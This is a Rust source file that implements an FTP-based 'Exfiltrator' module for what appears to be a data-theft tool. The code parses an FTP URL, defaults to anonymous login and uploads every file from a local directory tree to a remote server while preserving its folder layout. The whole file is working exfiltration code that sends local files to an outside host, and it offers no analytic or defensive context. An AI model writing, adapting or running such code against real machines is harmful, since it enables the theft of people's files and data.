use super::Exfiltrator;
use std::error::Error;
use std::fs::File;
use std::io::Read;
use std::path::Path;
use suppaftp::FtpStream;
use url::Url;

pub struct FtpExfiltrator {
    host: String,
    port: u16,
    user: String,
    pass: String,
    base_path: String,
}

impl FtpExfiltrator {
    pub fn from_url(url: &Url) -> Result<Self, String> {
        let host = url.host_str().ok_or("FTP URL missing host")?.to_string();
        let port = url.port().unwrap_or(21);
        let user = if url.username().is_empty() {
            "anonymous".to_string()
        } else {
            url.username().to_string()
        };
        let pass = url
            .password()
            .map(str::to_string)
            .unwrap_or_else(|| "anonymous@domain.com".to_string());
        let base_path = url.path().trim_matches('/').to_string();

        Ok(Self {
            host,
            port,
            user,
            pass,
            base_path,
        })
    }
}

/// Compute the path of `local_path` relative to `root_dir`, prefixed by the
/// name of `root_dir` itself. Example: root=`C:\x\pruebas`, local=`C:\x\pruebas\a\b.txt`
/// → `pruebas/a/b.txt`.
fn relative_remote_path(root_dir: &Path, local_path: &Path) -> String {
    let root_name = root_dir
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("root");

    let relative = local_path
        .strip_prefix(root_dir)
        .map(Path::to_path_buf)
        .unwrap_or_else(|_| local_path.to_path_buf());

    let rel_str = relative.to_string_lossy().replace('\\', "/");
    format!("{}/{}", root_name, rel_str)
}

impl Exfiltrator for FtpExfiltrator {
    fn upload_file(&mut self, local_path: &Path, root_dir: &Path) -> Result<(), Box<dyn Error>> {
        let rel = relative_remote_path(root_dir, local_path);

        let combined = if self.base_path.is_empty() {
            rel
        } else {
            format!("{}/{}", self.base_path, rel)
        };

        let (folder, file_name) = match combined.rsplit_once('/') {
            Some((f, n)) => (f.to_string(), n.to_string()),
            None => (String::new(), combined.clone()),
        };

        let mut stream = FtpStream::connect((self.host.as_str(), self.port))?;
        stream.login(&self.user, &self.pass)?;

        stream.cwd("/")?;
        for part in folder.split('/').filter(|s| !s.is_empty()) {
            let _ = stream.mkdir(part);
            stream.cwd(part)?;
        }

        let mut file = File::open(local_path)?;
        let mut buf = Vec::new();
        file.read_to_end(&mut buf)?;
        stream.put_file(file_name.as_str(), &mut &buf[..])?;

        stream.quit()?;
        Ok(())
    }

    fn describe(&self) -> String {
        let base = if self.base_path.is_empty() {
            "/".to_string()
        } else {
            format!("/{}", self.base_path)
        };
        format!("ftp://{}@{}:{}{}", self.user, self.host, self.port, base)
    }
}
